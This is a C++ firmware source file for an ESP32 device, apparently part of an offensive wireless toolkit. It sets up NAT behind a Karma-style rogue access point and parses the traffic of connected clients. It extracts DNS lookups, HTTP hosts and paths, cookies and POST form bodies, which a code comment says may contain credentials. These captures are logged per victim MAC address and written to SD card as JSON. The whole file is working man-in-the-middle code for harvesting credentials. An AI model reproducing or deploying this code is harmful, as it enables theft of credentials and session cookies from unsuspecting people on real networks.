/**
 * @file traffic_proxy.cpp
 * @brief NAT-based traffic proxy implementation
 */

#include "traffic_proxy.h"

#ifdef ESP32
#include <lwip/ip4_napt.h>
#include <lwip/lwip_napt.h>
#include <lwip/tcpip.h>  // For LOCK_TCPIP_CORE
#include <esp_netif.h>   // For esp_netif_napt_enable (ESP-IDF 5.x)
#include <dhcpserver/dhcpserver.h>  // For DHCP server types
#include <esp_wifi.h>
#include <SD.h>

// IP/TCP/UDP header offsets for promiscuous mode parsing
#define IP_HEADER_OFFSET 34        // After 802.11 header (varies)
#define UDP_HEADER_SIZE 8
#define DNS_PORT 53
#define HTTP_PORT 80

#endif

namespace adversary {

static TrafficProxy* s_instance = nullptr;

TrafficProxy& TrafficProxy::getInstance() {
    if (!s_instance) s_instance = new TrafficProxy();
    return *s_instance;
}

// =============================================================================
// NAT Setup/Teardown
// =============================================================================

bool TrafficProxy::setupNAT() {
#ifdef ESP32
    // Check prerequisites
    if (WiFi.status() != WL_CONNECTED) {
        Serial.println("[Proxy] ERROR: WiFi not connected to upstream AP");
        return false;
    }
    
    if (WiFi.softAPIP() == IPAddress(0, 0, 0, 0)) {
        Serial.println("[Proxy] ERROR: SoftAP not active");
        return false;
    }
    
    // Enable IP forwarding and NAT
    // This uses the ESP-IDF 5.x esp_netif_napt_enable API
    
    IPAddress softApIp = WiFi.softAPIP();
    IPAddress gatewayIp = WiFi.gatewayIP();
    
    Serial.println("[Proxy] Setting up NAT...");
    Serial.printf("[Proxy] SoftAP IP: %s\n", softApIp.toString().c_str());
    Serial.printf("[Proxy] Station IP: %s\n", WiFi.localIP().toString().c_str());
    Serial.printf("[Proxy] Gateway IP: %s\n", gatewayIp.toString().c_str());
    
    // Get the SoftAP network interface handle
    esp_netif_t* ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    if (ap_netif == nullptr) {
        Serial.println("[Proxy] ERROR: Could not get SoftAP network interface!");
        return false;
    }
    
    // Enable NAPT on the SoftAP interface (ESP-IDF 5.x API)
    esp_err_t err = esp_netif_napt_enable(ap_netif);
    if (err != ESP_OK) {
        Serial.printf("[Proxy] ERROR: esp_netif_napt_enable failed: %s\n", esp_err_to_name(err));
        // Fallback to legacy API
        Serial.println("[Proxy] Trying legacy ip_napt_enable...");
        LOCK_TCPIP_CORE();
        ip_napt_enable(softApIp, 1);
        UNLOCK_TCPIP_CORE();
    } else {
        Serial.println("[Proxy] esp_netif_napt_enable succeeded!");
    }
    
    // Configure DNS for SoftAP clients
    // Get the DNS server from our STA connection and pass it to AP clients
    esp_netif_t* sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    esp_netif_dns_info_t dns_info;
    
    if (sta_netif != nullptr && esp_netif_get_dns_info(sta_netif, ESP_NETIF_DNS_MAIN, &dns_info) == ESP_OK) {
        // Set the SoftAP to provide this DNS to connected clients
        esp_netif_dhcps_stop(ap_netif);  // Must stop DHCP server to change settings
        
        // Set DNS server option for DHCP
        dhcps_offer_t offer_dns = OFFER_DNS;
        esp_netif_dhcps_option(ap_netif, ESP_NETIF_OP_SET, ESP_NETIF_DOMAIN_NAME_SERVER, &offer_dns, sizeof(offer_dns));
        
        // Use upstream DNS
        esp_netif_set_dns_info(ap_netif, ESP_NETIF_DNS_MAIN, &dns_info);
        
        esp_netif_dhcps_start(ap_netif);  // Restart DHCP server
        
        char dns_str[16];
        ip4addr_ntoa_r((const ip4_addr_t*)&dns_info.ip.u_addr.ip4, dns_str, sizeof(dns_str));
        Serial.printf("[Proxy] Configured DNS for AP clients: %s\n", dns_str);
    } else {
        // Fallback to Google DNS
        Serial.println("[Proxy] Using fallback DNS: 8.8.8.8");
        esp_netif_dhcps_stop(ap_netif);
        
        dhcps_offer_t offer_dns = OFFER_DNS;
        esp_netif_dhcps_option(ap_netif, ESP_NETIF_OP_SET, ESP_NETIF_DOMAIN_NAME_SERVER, &offer_dns, sizeof(offer_dns));
        
        dns_info.ip.u_addr.ip4.addr = ipaddr_addr("8.8.8.8");
        dns_info.ip.type = ESP_IPADDR_TYPE_V4;
        esp_netif_set_dns_info(ap_netif, ESP_NETIF_DNS_MAIN, &dns_info);
        
        esp_netif_dhcps_start(ap_netif);
    }
    
    natEnabled_ = true;
    Serial.println("[Proxy] NAT enabled - forwarding SoftAP traffic to Station");
    
    return true;
#else
    return false;
#endif
}

void TrafficProxy::teardownNAT() {
#ifdef ESP32
    if (natEnabled_) {
        // Must lock TCPIP core for thread-safe LWIP API access
        LOCK_TCPIP_CORE();
        ip_napt_enable(WiFi.softAPIP(), 0);
        UNLOCK_TCPIP_CORE();
        natEnabled_ = false;
        Serial.println("[Proxy] NAT disabled");
    }
#endif
}

// =============================================================================
// Start/Stop
// =============================================================================

bool TrafficProxy::start() {
    if (state_ == ProxyState::RUNNING) {
        return true;
    }
    
    state_ = ProxyState::STARTING;
    stats_.reset();
    
    // Allocate memory for buffers on demand
    allocateBuffers();
    
    dnsHead_ = 0;
    dnsCount_ = 0;
    httpHead_ = 0;
    httpCount_ = 0;
    domainCount_ = 0;
    uniqueDomains_.clear();
    
#ifdef ESP32
    Serial.println("[Proxy] Starting traffic proxy...");
    
    if (!setupNAT()) {
        state_ = ProxyState::ERROR;
        return false;
    }
    
    // NOTE: We do NOT set up our own promiscuous callback here because
    // KarmaAP already has promiscuous mode enabled with its probe callback.
    // Setting our callback would overwrite Karma's probe capture.
    // NAT works at a lower level and doesn't require promiscuous mode for traffic forwarding.
    Serial.println("[Proxy] NAT-only mode (Karma handles probe capture)");
    
    lastSaveTime_ = millis();
    state_ = ProxyState::RUNNING;
    Serial.println("[Proxy] Traffic proxy running");
    return true;
#else
    state_ = ProxyState::ERROR;
    return false;
#endif
}

void TrafficProxy::stop() {
    if (state_ == ProxyState::STOPPED) {
        return;
    }
    
    state_ = ProxyState::STOPPING;
    
#ifdef ESP32
    Serial.println("[Proxy] Stopping traffic proxy...");
    
    // Disable promiscuous mode
    if (promiscuousEnabled_) {
        esp_wifi_set_promiscuous(false);
        promiscuousEnabled_ = false;
        Serial.println("[Proxy] Promiscuous mode disabled");
    }
    
    // Auto-save before stopping
    autoSave();
#endif
    
    teardownNAT();
    
    // Release buffer memory
    deallocateBuffers();
    
    state_ = ProxyState::STOPPED;
    
#ifdef ESP32
    Serial.printf("[Proxy] Stopped. Stats: %lu packets, %lu DNS, %lu HTTP\n",
                  stats_.totalPackets, stats_.dnsQueries, stats_.httpRequests);
#endif
}

void TrafficProxy::update() {
    if (state_ != ProxyState::RUNNING) {
        return;
    }
    
#ifdef ESP32
    // Auto-save periodically
    uint32_t now = millis();
    if (now - lastSaveTime_ >= AUTO_SAVE_INTERVAL_MS) {
        autoSave();
        lastSaveTime_ = now;
    }
#endif
}

void TrafficProxy::autoSave() {
#ifdef ESP32
    if (dnsCount_ > 0) {
        saveDNSLog(DNS_LOG_PATH);
    }
    if (httpCount_ > 0) {
        saveHTTPCaptures(HTTP_LOG_PATH);
    }
#endif
}

// =============================================================================
// DNS Parsing
// =============================================================================

bool TrafficProxy::parseDNSQuery(const uint8_t* data, uint16_t len, char* domain, size_t domainLen) {
    // DNS header is 12 bytes
    // Question section starts at offset 12
    if (len < 17) return false;
    
    const uint8_t* ptr = data + 12;  // Skip header
    size_t remaining = len - 12;
    size_t domainPos = 0;
    
    // Parse DNS name (labels)
    while (remaining > 0 && *ptr != 0) {
        uint8_t labelLen = *ptr++;
        remaining--;
        
        if (labelLen > remaining || labelLen > 63) {
            return false;  // Invalid
        }
        
        // Add dot separator
        if (domainPos > 0 && domainPos < domainLen - 1) {
            domain[domainPos++] = '.';
        }
        
        // Copy label
        for (uint8_t i = 0; i < labelLen && domainPos < domainLen - 1; i++) {
            domain[domainPos++] = (char)*ptr++;
            remaining--;
        }
    }
    
    domain[domainPos] = '\0';
    return domainPos > 0;
}

void TrafficProxy::processDNSPacket(const uint8_t* data, uint16_t len, const uint8_t* clientMac) {
    // Parse DNS query
    char domain[128] = {0};
    if (!parseDNSQuery(data, len, domain, sizeof(domain))) {
        return;
    }
    
    // Store in circular buffer
    DNSQuery& query = dnsQueries_[dnsHead_];
    query.reset();
    
#ifdef ESP32
    query.timestamp = millis();
#endif
    
    if (clientMac) {
        memcpy(query.clientMac, clientMac, 6);
    }
    strncpy(query.domain, domain, sizeof(query.domain) - 1);
    
    dnsHead_ = (dnsHead_ + 1) % MAX_DNS_QUERIES;
    if (dnsCount_ < MAX_DNS_QUERIES) dnsCount_++;
    
    stats_.dnsQueries++;
    
    // Track unique domain
    addUniqueDomain(domain);
    
    // Add to per-client traffic tracking
    if (clientMac) {
        addClientTrafficEntry(clientMac, TrafficEntryType::DNS, domain);
    }
    
    // Callback
    if (dnsCallback_) {
        dnsCallback_(query);
    }
    
#ifdef ESP32
    Serial.printf("[Proxy] DNS: %s\n", domain);
#endif
}

// =============================================================================
// HTTP Processing
// =============================================================================

void TrafficProxy::processHTTPPacket(const uint8_t* data, uint16_t len, const uint8_t* clientMac) {
    // Basic HTTP detection - look for "GET ", "POST ", "HEAD " etc.
    if (len < 16) return;
    
    const char* text = reinterpret_cast<const char*>(data);
    
    // Check for HTTP request
    bool isHTTP = (strncmp(text, "GET ", 4) == 0 ||
                   strncmp(text, "POST ", 5) == 0 ||
                   strncmp(text, "HEAD ", 5) == 0 ||
                   strncmp(text, "PUT ", 4) == 0);
    
    if (!isHTTP) return;
    
    // Store basic capture
    HTTPCapture& capture = httpCaptures_[httpHead_];
    capture.reset();
    
#ifdef ESP32
    capture.timestamp = millis();
#endif
    
    if (clientMac) {
        memcpy(capture.clientMac, clientMac, 6);
    }
    
    // Extract method
    const char* space = strchr(text, ' ');
    if (space && (space - text) < 8) {
        size_t methodLen = space - text;
        strncpy(capture.method, text, methodLen);
        capture.method[methodLen] = '\0';
        
        // Extract path
        const char* pathStart = space + 1;
        const char* pathEnd = strchr(pathStart, ' ');
        if (pathEnd) {
            size_t pathLen = pathEnd - pathStart;
            if (pathLen > sizeof(capture.path) - 1) {
                pathLen = sizeof(capture.path) - 1;
            }
            strncpy(capture.path, pathStart, pathLen);
            capture.path[pathLen] = '\0';
        }
    }
    
    // Extract Host header
    const char* hostHeader = strstr(text, "Host: ");
    if (!hostHeader) hostHeader = strstr(text, "host: ");
    if (hostHeader) {
        hostHeader += 6;  // Skip "Host: "
        const char* hostEnd = strstr(hostHeader, "\r\n");
        if (hostEnd) {
            size_t hostLen = hostEnd - hostHeader;
            if (hostLen > sizeof(capture.host) - 1) {
                hostLen = sizeof(capture.host) - 1;
            }
            strncpy(capture.host, hostHeader, hostLen);
            capture.host[hostLen] = '\0';
        }
    }
    
    // Extract Cookie header
    const char* cookieHeader = strstr(text, "Cookie: ");
    if (!cookieHeader) cookieHeader = strstr(text, "cookie: ");
    if (cookieHeader) {
        cookieHeader += 8;  // Skip "Cookie: "
        const char* cookieEnd = strstr(cookieHeader, "\r\n");
        if (cookieEnd) {
            size_t cookieLen = cookieEnd - cookieHeader;
            if (cookieLen > sizeof(capture.cookies) - 1) {
                cookieLen = sizeof(capture.cookies) - 1;
            }
            strncpy(capture.cookies, cookieHeader, cookieLen);
            capture.cookies[cookieLen] = '\0';
        }
    }
    
    // Extract POST body (for POST and PUT requests)
    if (strcmp(capture.method, "POST") == 0 || strcmp(capture.method, "PUT") == 0) {
        // Find Content-Length header
        uint16_t contentLength = 0;
        const char* clHeader = strstr(text, "Content-Length: ");
        if (!clHeader) clHeader = strstr(text, "content-length: ");
        if (clHeader) {
            clHeader += 16;  // Skip "Content-Length: "
            contentLength = (uint16_t)atoi(clHeader);
        }
        
        // Find end of headers (double CRLF)
        const char* bodyStart = strstr(text, "\r\n\r\n");
        if (bodyStart) {
            bodyStart += 4;  // Skip "\r\n\r\n"
            
            // Calculate available body length
            size_t headerLen = bodyStart - text;
            if (headerLen < len) {
                size_t availableBodyLen = len - headerLen;
                
                // Use Content-Length if available, otherwise use available data
                size_t bodyLen = contentLength > 0 ? 
                    (contentLength < availableBodyLen ? contentLength : availableBodyLen) : 
                    availableBodyLen;
                
                // Limit to buffer size
                if (bodyLen > sizeof(capture.postData) - 1) {
                    bodyLen = sizeof(capture.postData) - 1;
                }
                
                // Copy POST body
                if (bodyLen > 0) {
                    memcpy(capture.postData, bodyStart, bodyLen);
                    capture.postData[bodyLen] = '\0';
                    capture.postLen = (uint16_t)bodyLen;
                }
            }
        }
    }
    
    httpHead_ = (httpHead_ + 1) % MAX_HTTP_CAPTURES;
    if (httpCount_ < MAX_HTTP_CAPTURES) httpCount_++;
    
    stats_.httpRequests++;
    
    // Callback
    if (httpCallback_) {
        httpCallback_(capture);
    }
    
    // Add to per-client traffic tracking
    if (clientMac) {
        // Build request string for display (larger buffer to avoid truncation)
        char httpEntry[256];
        snprintf(httpEntry, sizeof(httpEntry), "%s %s%s", capture.method, capture.host, capture.path);
        addClientTrafficEntry(clientMac, TrafficEntryType::HTTP, httpEntry);
        
        // If POST data present, add as form entry
        if (capture.postLen > 0) {
            addClientTrafficEntry(clientMac, TrafficEntryType::FORM, capture.postData);
        }
    }
    
#ifdef ESP32
    if (capture.postLen > 0) {
        Serial.printf("[Proxy] HTTP: %s %s%s [%d bytes POST data]\n", 
                      capture.method, capture.host, capture.path, capture.postLen);
        // Log first part of POST data (may contain credentials)
        char preview[64];
        strncpy(preview, capture.postData, 60);
        preview[60] = '\0';
        if (capture.postLen > 60) strcat(preview, "...");
        Serial.printf("[Proxy] POST: %s\n", preview);
    } else {
        Serial.printf("[Proxy] HTTP: %s %s%s\n", capture.method, capture.host, capture.path);
    }
#endif
}

// =============================================================================
// Domain Tracking
// =============================================================================

void TrafficProxy::addUniqueDomain(const char* domain) {
    // Check if already tracked
    for (size_t i = 0; i < domainCount_; i++) {
        if (strcmp(domainStorage_[i], domain) == 0) {
            return;  // Already exists
        }
    }
    
    // Add new domain
    if (domainCount_ < MAX_UNIQUE_DOMAINS) {
        strncpy(domainStorage_[domainCount_], domain, 63);
        domainStorage_[domainCount_][63] = '\0';
        uniqueDomains_.push_back(domainStorage_[domainCount_]);
        domainCount_++;
        stats_.uniqueDomains = domainCount_;
    }
}

// =============================================================================
// SD Card Export
// =============================================================================

bool TrafficProxy::saveDNSLog(const char* path) {
#ifdef ESP32
    File file = SD.open(path, FILE_WRITE);
    if (!file) {
        Serial.printf("[Proxy] Failed to open %s for writing\n", path);
        return false;
    }
    
    file.println("# DNS Query Log");
    file.printf("# Total queries: %lu\n", stats_.dnsQueries);
    file.println("# Timestamp, Domain");
    
    for (size_t i = 0; i < dnsCount_; i++) {
        size_t idx = (dnsHead_ + MAX_DNS_QUERIES - dnsCount_ + i) % MAX_DNS_QUERIES;
        const DNSQuery& q = dnsQueries_[idx];
        file.printf("%lu, %s\n", q.timestamp, q.domain);
    }
    
    file.close();
    Serial.printf("[Proxy] DNS log saved to %s\n", path);
    return true;
#else
    (void)path;
    return false;
#endif
}

bool TrafficProxy::saveHTTPCaptures(const char* path) {
#ifdef ESP32
    File file = SD.open(path, FILE_WRITE);
    if (!file) {
        Serial.printf("[Proxy] Failed to open %s for writing\n", path);
        return false;
    }
    
    file.println("[");
    
    for (size_t i = 0; i < httpCount_; i++) {
        size_t idx = (httpHead_ + MAX_HTTP_CAPTURES - httpCount_ + i) % MAX_HTTP_CAPTURES;
        const HTTPCapture& c = httpCaptures_[idx];
        
        file.println("  {");
        file.printf("    \"timestamp\": %lu,\n", c.timestamp);
        file.printf("    \"method\": \"%s\",\n", c.method);
        file.printf("    \"host\": \"%s\",\n", c.host);
        file.printf("    \"path\": \"%s\",\n", c.path);
        file.printf("    \"cookies\": \"%s\",\n", c.cookies);
        // Escape and add POST data (truncate for safety)
        if (c.postLen > 0) {
            file.print("    \"postData\": \"");
            // Simple escape for JSON - replace quotes and backslashes
            for (size_t j = 0; j < c.postLen && j < 256; j++) {
                char ch = c.postData[j];
                if (ch == '"') file.print("\\\"");
                else if (ch == '\\') file.print("\\\\");
                else if (ch == '\n') file.print("\\n");
                else if (ch == '\r') file.print("\\r");
                else if (ch >= 32 && ch < 127) file.print(ch);
                else file.print('?');  // Replace non-printable
            }
            file.println("\",");
            file.printf("    \"postLen\": %u\n", c.postLen);
        } else {
            file.println("    \"postData\": null,");
            file.println("    \"postLen\": 0");
        }
        file.print("  }");
        if (i < httpCount_ - 1) file.println(",");
        else file.println();
    }
    
    file.println("]");
    file.close();
    Serial.printf("[Proxy] HTTP captures saved to %s\n", path);
    return true;
#else
    (void)path;
    return false;
#endif
}

// =============================================================================
// Per-Client Traffic Tracking
// =============================================================================

ClientTraffic* TrafficProxy::getClientByMac(const char* macStr) {
    auto it = clientTraffic_.find(macStr);
    if (it != clientTraffic_.end()) {
        return &it->second;
    }
    return nullptr;
}

void TrafficProxy::addClientTrafficEntry(const uint8_t* mac, TrafficEntryType type, const char* data) {
    char macStr[18];
    ClientTraffic::macToString(mac, macStr, sizeof(macStr));
    
    auto it = clientTraffic_.find(macStr);
    if (it == clientTraffic_.end()) {
        // Client not registered yet, register with unknown IP
        registerClient(mac, nullptr);
        it = clientTraffic_.find(macStr);
    }
    
    if (it != clientTraffic_.end()) {
        it->second.addEntry(type, data);
    }
}

void TrafficProxy::registerClient(const uint8_t* mac, const uint8_t* ip) {
    char macStr[18];
    ClientTraffic::macToString(mac, macStr, sizeof(macStr));
    
    auto it = clientTraffic_.find(macStr);
    if (it == clientTraffic_.end()) {
        // New client
        ClientTraffic client;
        memcpy(client.mac, mac, 6);
        if (ip) {
            memcpy(client.ip, ip, 4);
        }
        client.connectTime = millis();
        clientTraffic_[macStr] = client;
#ifdef ESP32
        Serial.printf("[Proxy] Registered client: %s\n", macStr);
#endif
    } else if (ip) {
        // Update IP if provided
        memcpy(it->second.ip, ip, 4);
    }
}

std::vector<std::string> TrafficProxy::getClientMacList() const {
    std::vector<std::string> macs;
    for (const auto& pair : clientTraffic_) {
        macs.push_back(pair.first);
    }
    return macs;
}

bool TrafficProxy::saveClientTraffic(const char* macStr) {
#ifdef ESP32
    auto it = clientTraffic_.find(macStr);
    if (it == clientTraffic_.end()) {
        Serial.printf("[Proxy] Client not found: %s\n", macStr);
        return false;
    }
    
    const ClientTraffic& client = it->second;
    
    // Create traffic directory
    if (!SD.exists(TRAFFIC_DIR)) {
        SD.mkdir(TRAFFIC_DIR);
    }
    
    // Build filename (replace : with -)
    char filename[64];
    char safeMac[18];
    strncpy(safeMac, macStr, sizeof(safeMac));
    for (char* p = safeMac; *p; p++) {
        if (*p == ':') *p = '-';
    }
    snprintf(filename, sizeof(filename), "%s/%s.traffic.json", TRAFFIC_DIR, safeMac);
    
    File file = SD.open(filename, FILE_WRITE);
    if (!file) {
        Serial.printf("[Proxy] Failed to create %s\n", filename);
        return false;
    }
    
    // Write JSON
    file.print("{\n");
    file.printf("  \"mac\": \"%s\",\n", macStr);
    file.printf("  \"ip\": \"%d.%d.%d.%d\",\n", client.ip[0], client.ip[1], client.ip[2], client.ip[3]);
    file.printf("  \"connectTime\": %lu,\n", client.connectTime);
    file.printf("  \"packetCount\": %lu,\n", client.packetCount);
    file.printf("  \"dnsCount\": %lu,\n", client.dnsCount);
    file.printf("  \"httpCount\": %lu,\n", client.httpCount);
    file.printf("  \"formCount\": %lu,\n", client.formCount);
    file.print("  \"entries\": [\n");
    
    for (size_t i = 0; i < client.entries.size(); i++) {
        const auto& entry = client.entries[i];
        const char* typeStr = "DNS";
        if (entry.type == TrafficEntryType::HTTP) typeStr = "HTTP";
        else if (entry.type == TrafficEntryType::FORM) typeStr = "FORM";
        
        // Escape JSON special chars in data
        char escaped[256];
        size_t j = 0;
        for (size_t k = 0; entry.data[k] && j < sizeof(escaped) - 2; k++) {
            char c = entry.data[k];
            if (c == '"' || c == '\\') {
                escaped[j++] = '\\';
            }
            escaped[j++] = c;
        }
        escaped[j] = '\0';
        
        file.printf("    {\"time\": %lu, \"type\": \"%s\", \"data\": \"%s\"}%s\n",
                    entry.timestamp, typeStr, escaped,
                    (i < client.entries.size() - 1) ? "," : "");
    }
    
    file.print("  ]\n");
    file.print("}\n");
    
    file.close();
    Serial.printf("[Proxy] Saved client traffic to %s\n", filename);
    return true;
#else
    (void)macStr;
    return false;
#endif
}

// =============================================================================
// Promiscuous Mode Packet Capture
// =============================================================================

#ifdef ESP32
void TrafficProxy::promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    // Only process data frames
    if (type != WIFI_PKT_DATA) {
        return;
    }
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    
    // Get instance
    TrafficProxy& proxy = TrafficProxy::getInstance();
    if (proxy.state_ != ProxyState::RUNNING) {
        return;
    }
    
    proxy.stats_.totalPackets++;
    
    // Skip 802.11 header - typically 24 bytes for data frames
    // This is simplified; real parsing would need to handle QoS, etc.
    if (len < 60) return;  // Too short for meaningful data
    
    // Extract source MAC (TA field, bytes 10-15 in 802.11 header)
    const uint8_t* srcMac = payload + 10;
    
    // Look for LLC/SNAP header (AA AA 03 00 00 00) followed by EtherType
    // Or just scan for IP header signature
    const uint8_t* ptr = payload + 24;  // After 802.11 header
    uint16_t remaining = len - 24;
    
    // Skip LLC/SNAP if present (8 bytes)
    if (remaining > 8 && ptr[0] == 0xAA && ptr[1] == 0xAA) {
        ptr += 8;
        remaining -= 8;
    }
    
    // Check for IPv4 (version 4 in upper nibble)
    if (remaining < 20) return;
    uint8_t ipVersion = (ptr[0] >> 4) & 0x0F;
    if (ipVersion != 4) return;
    
    uint8_t ipHeaderLen = (ptr[0] & 0x0F) * 4;
    if (ipHeaderLen < 20 || remaining < ipHeaderLen) return;
    
    uint8_t protocol = ptr[9];  // IP protocol field
    uint16_t totalLen = (ptr[2] << 8) | ptr[3];
    
    // Move to transport layer
    const uint8_t* transportPtr = ptr + ipHeaderLen;
    uint16_t transportLen = (totalLen > ipHeaderLen) ? (totalLen - ipHeaderLen) : 0;
    if (transportLen < 8) return;
    
    // Get destination port
    uint16_t dstPort = (transportPtr[2] << 8) | transportPtr[3];
    
    if (protocol == 17) {  // UDP
        if (dstPort == DNS_PORT) {
            // DNS query
            const uint8_t* dnsData = transportPtr + UDP_HEADER_SIZE;
            uint16_t dnsLen = transportLen - UDP_HEADER_SIZE;
            if (dnsLen > 12) {
                proxy.processDNSPacket(dnsData, dnsLen, srcMac);
            }
        }
    } else if (protocol == 6) {  // TCP
        // TCP header is at least 20 bytes
        if (transportLen < 20) return;
        
        uint8_t tcpHeaderLen = ((transportPtr[12] >> 4) & 0x0F) * 4;
        if (tcpHeaderLen < 20 || transportLen < tcpHeaderLen) return;
        
        if (dstPort == HTTP_PORT) {
            // HTTP request
            const uint8_t* httpData = transportPtr + tcpHeaderLen;
            uint16_t httpLen = transportLen - tcpHeaderLen;
            if (httpLen > 4) {
                proxy.processHTTPPacket(httpData, httpLen, srcMac);
            }
        } else if (dstPort == 443) {
            // HTTPS connection (just count it)
            proxy.stats_.httpsConnections++;
        }
    }
    
    proxy.stats_.bytesForwarded += len;
}
#endif

void TrafficProxy::allocateBuffers() {
    Serial.println("[Proxy] Allocating buffers...");
    dnsQueries_.resize(MAX_DNS_QUERIES);
    httpCaptures_.resize(MAX_HTTP_CAPTURES);
    uniqueDomains_.reserve(MAX_UNIQUE_DOMAINS);
}

void TrafficProxy::deallocateBuffers() {
    Serial.println("[Proxy] Releasing buffers...");
    
    dnsQueries_.clear();
    dnsQueries_.shrink_to_fit();
    
    httpCaptures_.clear();
    httpCaptures_.shrink_to_fit();
    
    uniqueDomains_.clear();
    uniqueDomains_.shrink_to_fit();
    
    clientTraffic_.clear(); // Also clear per-client tracking to save RAM
    // Note: map doesn't have shrink_to_fit but clearing it releases node memory
}

} // namespace adversary
